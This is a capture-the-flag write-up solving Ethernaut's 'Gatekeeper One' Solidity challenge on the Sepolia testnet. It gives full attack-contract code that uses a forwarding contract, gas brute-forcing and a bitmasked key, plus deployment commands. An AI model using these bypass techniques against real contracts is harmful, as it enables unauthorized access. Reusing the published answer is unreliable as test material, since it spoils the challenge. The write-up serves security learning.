# 13 - Gatekeeper One

## Overview

- **Difficulty:** 7/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x818790ee6d5472c61178c2a9d312f8383b6e09c0`](https://sepolia.etherscan.io/address/0x818790ee6d5472c61178c2a9d312f8383b6e09c0)
- **Attack Contract (`GatekeeperOneCaller`):** [`0xa65719e08ebcfe1c475026556ee3451c5f369e7f`](https://sepolia.etherscan.io/address/0xa65719e08ebcfe1c475026556ee3451c5f369e7f)
- **Transactions:**
  - **1. Deploy (`GatekeeperOneCaller`):** [`0xe2f89603a4411dc451eb3a73d29d4b1cd728b766fd7a36fe02d72b88248feae6`](https://sepolia.etherscan.io/tx/0xe2f89603a4411dc451eb3a73d29d4b1cd728b766fd7a36fe02d72b88248feae6)
  - **2. Exploit (`callEnter()`):** [`0xfec22a38a778679f326f3560a8e5adad22d4a7c5e38ce22b7cd00b4f52f3b7ec`](https://sepolia.etherscan.io/tx/0xfec22a38a778679f326f3560a8e5adad22d4a7c5e38ce22b7cd00b4f52f3b7ec)
  - **3. Level Submission:** [`0xf8702032241225daa106b9ae188d00dff914af365acfda2af22118662054d828`](https://sepolia.etherscan.io/tx/0xf8702032241225daa106b9ae188d00dff914af365acfda2af22118662054d828)

---

## Objective

Pass through all three gatekeeper modifiers and register your account address as the `entrant`.

---

## Contract Analysis

The target contract is [`src/13-gatekeeper-one/GatekeeperOne.sol`](./GatekeeperOne.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

### Vulnerability Breakdown

To enter the contract, we must satisfy three distinct gating conditions:

#### Gate One: Origin vs Sender Check

```solidity
require(msg.sender != tx.origin);
```

- `tx.origin` is the EOA that initiated the transaction.
- `msg.sender` is the immediate caller.
- Calling `enter()` through an intermediate exploit contract (`GatekeeperOneCaller`) ensures `msg.sender == GatekeeperOneCaller` and `tx.origin == Player EOA`, satisfying Gate One.

---

#### Gate Two: Gas Alignment Check

```solidity
require(gasleft() % 8191 == 0);
```

- The remaining gas at the point of executing this statement must be an exact multiple of `8191`.
- Calculating exact opcode gas costs by hand is fragile because compiler optimizations, opcode costs across EVM forks, and memory expansion costs change gas usage.
- **Solution — On-Chain Brute Force:**
  In [`GatekeeperOneCaller.sol`](./GatekeeperOneCaller.sol), we loop through values from `0` to `8191` and forward `(8191 * 3) + i` gas:
  ```solidity
  for (uint256 i; i < 8191; i++) {
      uint256 gasValue = i + (8191 * 3);
      (bool success,) = _gatekeeperOne.call{gas: gasValue}(...);
      if (success) break;
  }
  ```
  When a sub-call fails at Gate Two, it immediately reverts and refunds all unused gas to the loop. Each failed attempt costs only a few hundred gas, allowing the contract to find the exact matching offset within a single transaction!

---

#### Gate Three: Bitwise Masking

Gate Three evaluates three conditions against `bytes8 _gateKey`:

1. **Part One:**
   $$\text{uint32}(\text{uint64}(\_gateKey)) == \text{uint16}(\text{uint64}(\_gateKey))$$
   Downcasting to `uint32` keeps the lower 4 bytes. Downcasting to `uint16` keeps the lower 2 bytes. For these to be equal, bytes 4 and 5 must be `0x0000`:
   $$\text{Key Shape: } 0x????????0000XXXX$$

2. **Part Two:**
   $$\text{uint32}(\text{uint64}(\_gateKey)) \ne \text{uint64}(\_gateKey)$$
   The full 8 bytes must not equal the lower 4 bytes. Therefore, the highest 4 bytes cannot be zero:
   $$\text{Key Shape: } 0xYYYYYYYY0000XXXX \quad (Y \ne 0)$$

3. **Part Three:**
   $$\text{uint32}(\text{uint64}(\_gateKey)) == \text{uint16}(\text{uint160}(tx.origin))$$
   The lower 2 bytes of the key (`XXXX`) must match the lower 2 bytes of `tx.origin`:
   $$\text{Key Shape: } 0x123456780000 + \text{last 2 bytes of } tx.origin$$

---

## Attack Contract

The exploit is implemented in [`src/13-gatekeeper-one/GatekeeperOneCaller.sol`](./GatekeeperOneCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract GatekeeperOneCaller {
    function callEnter(address _gatekeeperOne) public {
        bytes8 gateKey = _computeKey();

        for (uint256 i; i < 8191; i++) {
            uint256 gasValue = i + (8191 * 3);

            (bool success,) = _gatekeeperOne.call{gas: gasValue}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (success) {
                break;
            }
        }
    }

    function _computeKey() internal view returns (bytes8) {
        // High 4 bytes non-zero (satisfies Part Two)
        uint64 firstPart = uint64(0x12345678) << 32;

        // Low 2 bytes equal to tx.origin (satisfies Part One & Part Three)
        uint64 lastPart = uint64(uint16(uint160(tx.origin)));

        return bytes8(firstPart | lastPart);
    }
}
```

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy `GatekeeperOneCaller`

```bash
forge create src/13-gatekeeper-one/GatekeeperOneCaller.sol:GatekeeperOneCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --broadcast
```

- **Deploy Tx:** [`0xe2f89603a4411dc451eb3a73d29d4b1cd728b766fd7a36fe02d72b88248feae6`](https://sepolia.etherscan.io/tx/0xe2f89603a4411dc451eb3a73d29d4b1cd728b766fd7a36fe02d72b88248feae6)
- **Deployed Address:** [`0xa65719e08ebcfe1c475026556ee3451c5f369e7f`](https://sepolia.etherscan.io/address/0xa65719e08ebcfe1c475026556ee3451c5f369e7f)

### 2. Execute `callEnter`

Call `callEnter` passing the `GatekeeperOne` instance address. Provide an explicit `--gas-limit` (e.g. `2000000`) so the outer transaction has sufficient gas to iterate through the brute-force loop:

```bash
cast send 0xa65719e08ebcfe1c475026556ee3451c5f369e7f \
  "callEnter(address)" 0x818790ee6d5472c61178c2a9d312f8383b6e09c0 \
  --gas-limit 2000000 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Exploit Tx:** [`0xfec22a38a778679f326f3560a8e5adad22d4a7c5e38ce22b7cd00b4f52f3b7ec`](https://sepolia.etherscan.io/tx/0xfec22a38a778679f326f3560a8e5adad22d4a7c5e38ce22b7cd00b4f52f3b7ec)

### 3. Verify `entrant`

Verify that the `entrant` state variable is now your player address:

```bash
cast call 0x818790ee6d5472c61178c2a9d312f8383b6e09c0 "entrant()(address)" --rpc-url sepolia
# Output: Returns player address
```

### 4. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0xf8702032241225daa106b9ae188d00dff914af365acfda2af22118662054d828`](https://sepolia.etherscan.io/tx/0xf8702032241225daa106b9ae188d00dff914af365acfda2af22118662054d828)

---

## Key Security Takeaways

1. **Avoid Strict `gasleft()` Checks:**
   Writing assertions on exact `gasleft()` values creates brittle, non-standard contracts that are susceptible to failure across hard forks, compiler versions, or optimization flag changes.
2. **`tx.origin != msg.sender` Does Not Prevent Automation:**
   Restricting calls to prevent contracts from interacting with your system can easily be bypassed by deploying simple forwarding contracts.
3. **Integer Casting Masking:**
   Solidity type casting discards higher-order bits when downcasting numbers (unlike bytes downcasting, which truncates lower-order bits from the right). Always understand integer bitwise representations when implementing custom key validations.
